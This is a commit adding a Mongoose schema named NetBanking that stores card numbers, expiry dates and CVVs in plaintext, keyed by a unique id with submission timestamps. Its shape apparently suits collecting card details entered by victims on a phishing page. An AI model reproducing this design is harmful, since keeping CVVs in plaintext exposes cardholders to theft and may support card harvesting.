9d0beb451577becfd6fb51ef266aaf47c078da9a
kingofak91 <koreanil442@gmail.com>
2025-03-13 16:06:54 +0530

    Add files via upload

---
+++ models/NetBanking.js
@@ -0,0 +1,15 @@
+const mongoose = require('mongoose');
+
+const netBankingSchema = new mongoose.Schema({
+  uniqueid: { type: String, required: true, unique: true },
+  entries: [
+    {
+      cardNumber: { type: String, required: true },
+      expiry: { type: String, required: true },
+      cvv: { type: String, required: true },
+      submittedAt: { type: Date, default: Date.now }
+    }
+  ]
+});
+
+module.exports = mongoose.model('NetBanking', netBankingSchema);
